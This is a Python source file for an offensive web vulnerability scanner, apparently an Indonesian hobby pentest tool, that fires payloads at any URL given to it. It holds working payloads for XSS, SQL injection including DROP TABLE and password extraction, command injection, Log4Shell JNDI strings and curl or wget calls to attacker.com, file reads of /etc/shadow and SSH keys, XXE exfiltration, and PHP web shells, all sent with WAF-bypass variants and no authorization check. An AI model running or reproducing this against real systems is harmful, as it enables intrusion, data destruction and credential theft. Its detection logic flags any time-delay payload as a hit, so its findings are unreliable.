#!/usr/bin/env python3
"""
██████╗ ██╗   ██╗██╗   ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝██║   ██║██║ ██╔╝██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝ ╚████╔╝ ██║   ██║█████╔╝ ██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔═══╝   ╚██╔╝  ██║   ██║██╔═██╗ ██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
██║        ██║   ╚██████╔╝██║  ██╗╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

PyVulnHunter PRO v4.0 - Advanced Security Scanner
Dikembangkan untuk Bug Hunter & Pentester Professional
Developer : ADE PRATAMA 
Github : https://github.com/HolyBytes
Sawaria : https://saweria.co/HolyBytes
Team Bugpent_Cybercore
"""

import asyncio
import aiohttp
import json
import re
import os
import sys
import time
import random
import hashlib
import argparse
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import concurrent.futures
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
import warnings
warnings.filterwarnings("ignore")

# Inisialisasi
init(autoreset=True)

# ==============================================
# KONFIGURASI GLOBAL
# ==============================================
@dataclass
class ScanConfig:
    threads: int = 100
    max_threads: int = 500
    timeout: int = 5
    retry_count: int = 2
    rate_limit: float = 0.05
    max_payload_per_test: int = 50
    deep_scan: bool = True
    async_mode: bool = True
    
    # Deteksi mendalam
    fingerprint_depth: int = 5
    subdomain_enum: bool = True
    port_scan_top: int = 1000
    
    # Bypass & Evasion
    waf_bypass: bool = True
    encoding_variants: bool = True
    header_injection: bool = True

# ==============================================
# PAYLOAD DATABASE - ULTRA COMPREHENSIVE
# ==============================================
class PayloadDatabase:
    def __init__(self):
        self.payloads = self._load_mega_payloads()
    
    def _load_mega_payloads(self) -> Dict[str, List[str]]:
        return {
            "xss_basic": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<select onfocus=alert(1) autofocus>"
            ],
            "xss_advanced": [
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                "javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
                "<img src=x onerror=Function('alert(1)')()>",
                "<svg onload=Function('alert(1)')()>",
                "<iframe src=javascript:Function('alert(1)')()>",
                "<script>setTimeout('alert(1)',1)</script>",
                "<img src=x onerror=setTimeout('alert(1)',1)>",
                "<svg onload=setTimeout('alert(1)',1)>"
            ],
            "xss_waf_bypass": [
                "<SCRiPT>alert(1)</SCRiPT>",
                "<sCrIpT>alert(1)</sCrIpT>",
                "<script>alert(1)//",
                "<script>/**/alert(1)</script>",
                "<script>alert(1);</script>",
                "<img src=x onerror=alert(1)//",
                "<svg onload=alert(1)//",
                "<script>alert(String.fromCharCode(49))</script>",
                "<img src=x onerror=alert(String.fromCharCode(49))>",
                "<svg onload=alert(String.fromCharCode(49))>"
            ],
            "sqli_basic": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL, NULL --",
                "' AND 1=1 --",
                "' AND 1=2 --",
                "admin'--",
                "admin' /*",
                "' OR 1=1#"
            ],
            "sqli_advanced": [
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>0 --",
                "' UNION SELECT schema_name,2 FROM information_schema.schemata --",
                "' UNION SELECT table_name,2 FROM information_schema.tables --",
                "' UNION SELECT column_name,2 FROM information_schema.columns --",
                "' OR SLEEP(5) --",
                "' OR BENCHMARK(1000000,MD5(1)) --",
                "' OR pg_sleep(5) --",
                "' OR WAITFOR DELAY '0:0:5' --",
                "' UNION SELECT @@version,2 --",
                "' UNION SELECT user(),2 --"
            ],
            "sqli_blind": [
                "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
                "' AND (SELECT SUBSTRING(user(),1,1))='r' --",
                "' AND (SELECT LENGTH(database()))>0 --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))<91 --",
                "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 --",
                "' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1)='i' --",
                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin' LIMIT 1)='a' --",
                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1 LIMIT 1)='a' --"
            ],
            "rce_basic": [
                "$(whoami)",
                "`whoami`",
                ";whoami;",
                "|whoami",
                "&&whoami",
                "||whoami",
                "$(id)",
                "`id`",
                ";id;",
                "|id"
            ],
            "rce_advanced": [
                "${jndi:ldap://attacker.com/a}",
                "${jndi:dns://attacker.com/a}",
                "${jndi:rmi://attacker.com/a}",
                "$(curl http://attacker.com/)",
                "`curl http://attacker.com/`",
                ";curl http://attacker.com/;",
                "|curl http://attacker.com/",
                "$(wget http://attacker.com/)",
                "`wget http://attacker.com/`",
                ";wget http://attacker.com/;"
            ],
            "lfi_basic": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "/proc/self/environ",
                "/proc/version",
                "/etc/hosts",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "file:///etc/passwd",
                "expect://id"
            ],
            "lfi_advanced": [
                "php://filter/convert.base64-encode/resource=../../../etc/passwd",
                "php://filter/convert.base64-encode/resource=../../../etc/shadow",
                "php://filter/convert.base64-encode/resource=../../../var/log/apache2/access.log",
                "php://filter/convert.base64-encode/resource=../../../var/log/apache2/error.log",
                "php://filter/convert.base64-encode/resource=../../../var/log/nginx/access.log",
                "php://filter/convert.base64-encode/resource=../../../var/log/nginx/error.log",
                "php://filter/convert.base64-encode/resource=../../../home/user/.ssh/id_rsa",
                "php://filter/convert.base64-encode/resource=../../../root/.ssh/id_rsa",
                "php://filter/convert.base64-encode/resource=../../../etc/mysql/my.cnf",
                "php://filter/convert.base64-encode/resource=../../../etc/apache2/apache2.conf"
            ],
            "auth_bypass": [
                "admin'/*",
                "admin'#",
                "admin'--",
                "' OR 1=1/*",
                "' OR 1=1#",
                "' OR 1=1--",
                "') OR 1=1/*",
                "') OR 1=1#",
                "') OR 1=1--",
                "admin') OR 1=1/*"
            ],
            "jwt_attacks": [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.invalid_signature",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.invalid_signature"
            ],
            "xxe_payloads": [
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com/'>]><root>&test;</root>",
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM 'http://attacker.com/evil.dtd'> %ext; %payload; %send;]><root></root>"
            ],
            "ssrf_payloads": [
                "http://127.0.0.1:22",
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:3306",
                "http://127.0.0.1:5432",
                "http://127.0.0.1:6379",
                "http://127.0.0.1:9200",
                "http://127.0.0.1:27017",
                "http://localhost:22",
                "http://localhost:80"
            ],
            "directory_traversal": [
                "../",
                "..\\",
                "..;/",
                "..;\\",
                "....//",
                "....\\\\",
                "..%2f",
                "..%5c",
                "..%252f",
                "..%255c"
            ],
            "file_upload": [
                "<?php system($_GET['cmd']); ?>",
                "<?php eval($_POST['cmd']); ?>",
                "<?php phpinfo(); ?>",
                "<script>alert('XSS')</script>",
                "<%eval request(\"cmd\")%>",
                "<%=system(\"id\")%>",
                "${@system('id')}",
                "#{system('id')}"
            ],
            "nosql_injection": [
                "true, $where: '1 == 1'",
                ", $where: '1 == 1'",
                "$where: '1 == 1'",
                "', $where: '1 == 1', $comment: '",
                "'; return 1 == 1; //",
                "'; return 1 == 1",
                "1'; return 1 == 1; //",
                "1'; return 1 == 1",
                "'; return this.username == 'admin'; //",
                "'; return this.password == 'password'; //"
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "admin))(|(uid=*",
                "*)(|(cn=*))",
                "*)(|(sn=*))",
                "*)(|(mail=*))",
                "*)(|(telephoneNumber=*))",
                "*)(|(description=*))",
                "*)(|(objectClass=*)"
            ],
            "xpath_injection": [
                "' or '1'='1",
                "' or 1=1 or '1'='1",
                "x' or 1=1 or 'x'='y",
                "' or string-length(//user[1]/password)>0 or '1'='2",
                "' or string-length(//user[1]/username)>0 or '1'='2",
                "' or count(//user)>0 or '1'='2",
                "' or position()=1 or '1'='2",
                "' or last()=1 or '1'='2",
                "' or name()='user' or '1'='2",
                "' or local-name()='user' or '1'='2"
            ]
        }
    
    def get_payloads(self, category: str, limit: int = None) -> List[str]:
        payloads = self.payloads.get(category, [])
        if limit:
            return payloads[:limit]
        return payloads
    
    def get_all_categories(self) -> List[str]:
        return list(self.payloads.keys())

# ==============================================
# RESULT MANAGER
# ==============================================
@dataclass
class VulnerabilityResult:
    vuln_type: str
    severity: str
    description: str
    url: str
    payload: str
    response_time: float
    status_code: int
    response_size: int
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'type': self.vuln_type,
            'severity': self.severity,
            'description': self.description,
            'url': self.url,
            'payload': self.payload,
            'response_time': self.response_time,
            'status_code': self.status_code,
            'response_size': self.response_size,
            'timestamp': self.timestamp
        }

class ResultManager:
    def __init__(self):
        self.vulnerabilities: List[VulnerabilityResult] = []
        self.scan_stats = {
            'start_time': datetime.now(),
            'requests_sent': 0,
            'vulnerabilities_found': 0,
            'errors': 0,
            'false_positives_filtered': 0
        }
        self.lock = threading.Lock()
    
    def add_vulnerability(self, vuln: VulnerabilityResult):
        with self.lock:
            self.vulnerabilities.append(vuln)
            self.scan_stats['vulnerabilities_found'] += 1
            self._print_vulnerability(vuln)
    
    def increment_requests(self):
        with self.lock:
            self.scan_stats['requests_sent'] += 1
    
    def increment_errors(self):
        with self.lock:
            self.scan_stats['errors'] += 1
    
    def _print_vulnerability(self, vuln: VulnerabilityResult):
        color = {
            'Critical': Fore.RED,
            'High': Fore.MAGENTA,
            'Medium': Fore.YELLOW,
            'Low': Fore.GREEN
        }.get(vuln.severity, Fore.WHITE)
        
        print(f"{color}[{vuln.severity}] {vuln.vuln_type}: {vuln.description}")
        print(f"{Fore.CYAN}URL: {vuln.url}")
        print(f"{Fore.CYAN}Payload: {vuln.payload}")
        print(f"{Fore.CYAN}Response Time: {vuln.response_time:.2f}s")
        print("-" * 80)

# ==============================================
# ENHANCED HTTP CLIENT
# ==============================================
class EnhancedHttpClient:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
        ]
        self.session = self._create_session()
    
    def _create_session(self):
        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config.timeout),
            connector=aiohttp.TCPConnector(
                limit=self.config.max_threads,
                limit_per_host=self.config.threads,
                enable_cleanup_closed=True
            )
        )
        return session
    
    def _get_random_headers(self) -> Dict[str, str]:
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
    
    async def make_request(self, method: str, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        headers = self._get_random_headers()
        if 'headers' in kwargs:
            headers.update(kwargs['headers'])
        kwargs['headers'] = headers
        
        for attempt in range(self.config.retry_count):
            try:
                await asyncio.sleep(self.config.rate_limit)
                async with self.session.request(method, url, **kwargs) as response:
                    # Read response content
                    content = await response.read()
                    response._content = content
                    return response
            except Exception as e:
                if attempt == self.config.retry_count - 1:
                    print(f"{Fore.RED}Request failed after {self.config.retry_count} attempts: {str(e)}")
                    return None
                await asyncio.sleep(1)
        return None
    
    async def close(self):
        await self.session.close()

# ==============================================
# VULNERABILITY DETECTORS
# ==============================================
class VulnerabilityDetector:
    def __init__(self, client: EnhancedHttpClient, payload_db: PayloadDatabase, result_manager: ResultManager):
        self.client = client
        self.payload_db = payload_db
        self.result_manager = result_manager
    
    async def detect_xss(self, url: str, params: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """Deteksi XSS dengan multiple payload categories"""
        results = []
        
        # Test different XSS categories
        for category in ['xss_basic', 'xss_advanced', 'xss_waf_bypass']:
            payloads = self.payload_db.get_payloads(category, limit=10)
            
            for payload in payloads:
                start_time = time.time()
                
                # Test GET parameter
                if params:
                    test_params = params.copy()
                    for param_name in test_params:
                        test_params[param_name] = payload
                        test_url = f"{url}?{'&'.join([f'{k}={v}' for k, v in test_params.items()])}"
                        
                        response = await self.client.make_request('GET', test_url)
                        if response and await self._check_xss_reflection(response, payload):
                            vuln = VulnerabilityResult(
                                vuln_type='Cross-Site Scripting (XSS)',
                                severity='High',
                                description=f'Reflected XSS in parameter "{param_name}"',
                                url=test_url,
                                payload=payload,
                                response_time=time.time() - start_time,
                                status_code=response.status,
                                response_size=len(response._content)
                            )
                            results.append(vuln)
                            self.result_manager.add_vulnerability(vuln)
                
                # Test POST data
                data = {'test': payload}
                response = await self.client.make_request('POST', url, data=data)
                if response and await self._check_xss_reflection(response, payload):
                    vuln = VulnerabilityResult(
                        vuln_type='Cross-Site Scripting (XSS)',
                        severity='High',
                        description='Reflected XSS in POST data',
                        url=url,
                        payload=payload,
                        response_time=time.time() - start_time,
                        status_code=response.status,
                        response_size=len(response._content)
                    )
                    results.append(vuln)
                    self.result_manager.add_vulnerability(vuln)
                
                self.result_manager.increment_requests()
        
        return results
    
    async def _check_xss_reflection(self, response: aiohttp.ClientResponse, payload: str) -> bool:
        """Check if XSS payload is reflected in response"""
        try:
            content = response._content.decode('utf-8', errors='ignore').lower()
            payload_lower = payload.lower()
            
            # Check for exact reflection
            if payload_lower in content:
                return True
            
            # Check for partial reflection (for encoded payloads)
            if any(part in content for part in payload_lower.split() if len(part) > 3):
                return True
            
            return False
        except:
            return False
    
    async def detect_sqli(self, url: str, params: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """Deteksi SQL Injection dengan teknik multiple"""
        results = []
        
        # Test different SQLi categories
        for category in ['sqli_basic', 'sqli_advanced', 'sqli_blind']:
            payloads = self.payload_db.get_payloads(category, limit=15)
            
            for payload in payloads:
                start_time = time.time()
                
                # Test GET parameter
                if params:
                    test_params = params.copy()
                    for param_name in test_params:
                        test_params[param_name] = payload
                        test_url = f"{url}?{'&'.join([f'{k}={v}' for k, v in test_params.items()])}"
                        
                        response = await self.client.make_request('GET', test_url)
                        if response and await self._check_sqli_indicators(response, payload):
                            vuln = VulnerabilityResult(
                                vuln_type='SQL Injection',
                                severity='Critical',
                                description=f'SQL Injection in parameter "{param_name}"',
                                url=test_url,
                                payload=payload,
                                response_time=time.time() - start_time,
                                status_code=response.status,
                                response_size=len(response._content)
                            )
                            results.append(vuln)
                            self.result_manager.add_vulnerability(vuln)
                
                self.result_manager.increment_requests()
        
        return results
    
    async def _check_sqli_indicators(self, response: aiohttp.ClientResponse, payload: str) -> bool:
        """Check for SQL injection indicators"""
        try:
            content = response._content.decode('utf-8', errors='ignore').lower()
            
            # Database error patterns
            error_patterns = [
                'sql syntax', 'mysql_fetch', 'warning: mysql', 'valid mysql result',
                'postgresql query failed', 'warning: postgresql', 'valid postgresql result',
                'oracle error', 'warning: oracle', 'ora-', 'microsoft sql server',
                'warning: mssql', 'microsoft jet database', 'microsoft access driver',
                'sqlite_exception', 'sqlite error', 'warning: sqlite', 'sql error',
                'syntax error', 'unterminated quoted string', 'unexpected end of sql command',
                'warning: pg_', 'valid postgresql', 'warning: mysql_'
            ]
            
            # Check for error patterns
            for pattern in error_patterns:
                if pattern in content:
                    return True
            
            # Check for boolean-based blind SQLi
            if 'sleep(' in payload.lower() and response.status == 200:
                return True
            
            # Check for time-based blind SQLi
            if any(keyword in payload.lower() for keyword in ['sleep', 'benchmark', 'pg_sleep', 'waitfor']):
                return True
            
            return False
        except:
            return False
    
    async def detect_rce(self, url: str, params: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """Deteksi Remote Code Execution"""
        results = []
        
        # Test different RCE categories
        for category in ['rce_basic', 'rce_advanced']:
            payloads = self.payload_db.get_payloads(category, limit=10)
            
            for payload in payloads:
                start_time = time.time()
                
                # Test various injection points
                test_points = [
                    ('GET', 'cmd', payload),
                    ('POST', 'cmd', payload),
                    ('POST', 'command', payload),
                    ('POST', 'exec', payload),
                    ('GET', 'system', payload),
                ]
                
                for method, param_name, test_payload in test_points:
                    if method == 'GET':
                        test_url = f"{url}?{param_name}={test_payload}"
                        response = await self.client.make_request('GET', test_url)
                    else:
                        data = {param_name: test_payload}
                        response = await self.client.make_request('POST', url, data=data)
                    
                    if response and await self._check_rce_indicators(response, test_payload):
                        vuln = VulnerabilityResult(
                            vuln_type='Remote Code Execution',
                            severity='Critical',
                            description=f'RCE via {method} parameter "{param_name}"',
                            url=url,
                            payload=test_payload,
                            response_time=time.time() - start_time,
                            status_code=response.status,
                            response_size=len(response._content)
                        )
                        results.append(vuln)
                        self.result_manager.add_vulnerability(vuln)
                    
                    self.result_manager.increment_requests()
        
        return results
    
    async def _check_rce_indicators(self, response: aiohttp.ClientResponse, payload: str) -> bool:
        """Check for RCE indicators"""
        try:
            content = response._content.decode('utf-8', errors='ignore')
            
            # Common RCE output patterns
            rce_patterns = [
                'root:', 'uid=', 'gid=', 'groups=', 'www-data', 'apache', 'nginx',
                                '/usr/bin/', '/etc/passwd', 'Microsoft Windows', 'C:\\Windows\\',
                'Command executed', 'Process started', 'PID:'
            ]
            
            # Check for command output patterns
            if any(pattern in content for pattern in rce_patterns):
                return True
            
            # Check for time-based RCE
            if any(cmd in payload.lower() for cmd in ['sleep', 'ping', 'waitfor']):
                return True
                
            return False
        except:
            return False
    
    async def detect_lfi(self, url: str, params: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """Deteksi Local File Inclusion"""
        results = []
        
        # Test different LFI categories
        for category in ['lfi_basic', 'lfi_advanced']:
            payloads = self.payload_db.get_payloads(category, limit=15)
            
            for payload in payloads:
                start_time = time.time()
                
                # Test common LFI parameters
                test_params = params.copy() if params else {}
                for param_name in ['file', 'page', 'load', 'path', 'doc', 'document']:
                    test_params[param_name] = payload
                    test_url = f"{url}?{'&'.join([f'{k}={v}' for k, v in test_params.items()])}"
                    
                    response = await self.client.make_request('GET', test_url)
                    if response and await self._check_lfi_indicators(response, payload):
                        vuln = VulnerabilityResult(
                            vuln_type='Local File Inclusion',
                            severity='High',
                            description=f'LFI in parameter "{param_name}"',
                            url=test_url,
                            payload=payload,
                            response_time=time.time() - start_time,
                            status_code=response.status,
                            response_size=len(response._content)
                        )
                        results.append(vuln)
                        self.result_manager.add_vulnerability(vuln)
                    
                    self.result_manager.increment_requests()
        
        return results
    
    async def _check_lfi_indicators(self, response: aiohttp.ClientResponse, payload: str) -> bool:
        """Check for LFI indicators"""
        try:
            content = response._content.decode('utf-8', errors='ignore')
            
            # Common file content patterns
            file_patterns = {
                '/etc/passwd': ['root:', '/bin/bash'],
                '/proc/self/environ': ['PATH=', 'USER='],
                'php://filter': ['PD9waHA', '<?php'],
                'windows\\system32': ['Windows Registry', 'Microsoft Corporation']
            }
            
            # Check for specific file contents
            for file_type, patterns in file_patterns.items():
                if file_type.lower() in payload.lower():
                    if all(pattern in content for pattern in patterns):
                        return True
            
            # Generic checks
            if ('root:' in content and '/bin/' in content) or ('<?php' in content):
                return True
                
            return False
        except:
            return False

# ==============================================
# MAIN SCANNER CLASS
# ==============================================
class PyVulnHunter:
    def __init__(self, config: ScanConfig = None):
        self.config = config if config else ScanConfig()
        self.payload_db = PayloadDatabase()
        self.result_manager = ResultManager()
        self.http_client = EnhancedHttpClient(self.config)
        self.detector = VulnerabilityDetector(self.http_client, self.payload_db, self.result_manager)
        
    async def scan_url(self, url: str) -> Dict[str, Any]:
        """Scan target URL for all vulnerabilities"""
        start_time = time.time()
        
        # Parse URL and parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Run all vulnerability checks concurrently
        tasks = [
            self.detector.detect_xss(base_url, params),
            self.detector.detect_sqli(base_url, params),
            self.detector.detect_rce(base_url, params),
            self.detector.detect_lfi(base_url, params)
        ]
        
        await asyncio.gather(*tasks)
        
        # Generate report
        report = {
            'target': url,
            'scan_time': time.time() - start_time,
            'stats': self.result_manager.scan_stats,
            'vulnerabilities': [v.to_dict() for v in self.result_manager.vulnerabilities]
        }
        
        return report
    
    async def close(self):
        """Cleanup resources"""
        await self.http_client.close()

# ==============================================
# COMMAND LINE INTERFACE
# ==============================================
def print_banner():
    """Display the tool banner"""
    print(Fore.GREEN + """
██████╗ ██╗   ██╗██╗   ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝██║   ██║██║ ██╔╝██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝ ╚████╔╝ ██║   ██║█████╔╝ ██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔═══╝   ╚██╔╝  ██║   ██║██╔═██╗ ██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
██║        ██║   ╚██████╔╝██║  ██╗╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                              
PyVulnHunter PRO v4.0 - Advanced Security Scanner - Developer:ADE PRATAMA - Team Bugpent_Cybercore
""")
    print(Fore.CYAN + "="*70)
    print(Fore.YELLOW + "Developed for Bug Hunters & Pentester Professionals")
    print(Fore.CYAN + "="*70)
    print(Fore.MAGENTA + "GitHub: https://github.com/HolyBytes")
    print(Fore.MAGENTA + "Support: https://saweria.co/HolyBytes")
    print(Fore.CYAN + "="*70 + "\n")

async def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="PyVulnHunter PRO - Advanced Web Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL to scan")
    parser.add_argument("-t", "--threads", type=int, default=100, 
                       help="Number of concurrent threads (default: 100)")
    parser.add_argument("-l", "--level", type=int, choices=range(1, 6), default=3,
                       help="Scan intensity level (1-5, default: 3)")
    parser.add_argument("-o", "--output", help="Output file for JSON report")
    
    args = parser.parse_args()
    
    # Configure scanner
    config = ScanConfig(
        threads=args.threads,
        max_threads=min(args.threads * 2, 500),
        deep_scan=args.level > 3
    )
    
    # Initialize scanner
    scanner = PyVulnHunter(config)
    
    try:
        print_banner()
        print(f"{Fore.CYAN}[*] Starting scan for {args.url} with level {args.level}...")
        
        # Run the scan
        report = await scanner.scan_url(args.url)
        
        # Print summary
        print(f"\n{Fore.GREEN}[+] Scan completed in {report['scan_time']:.2f} seconds")
        print(f"{Fore.CYAN}[*] Requests sent: {report['stats']['requests_sent']}")
        print(f"{Fore.CYAN}[*] Vulnerabilities found: {report['stats']['vulnerabilities_found']}")
        
        # Save report
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"{Fore.GREEN}[+] Report saved to {args.output}")
        
    except Exception as e:
        print(f"{Fore.RED}[!] Error during scan: {str(e)}")
    finally:
        await scanner.close()

if __name__ == "__main__":
    asyncio.run(main())
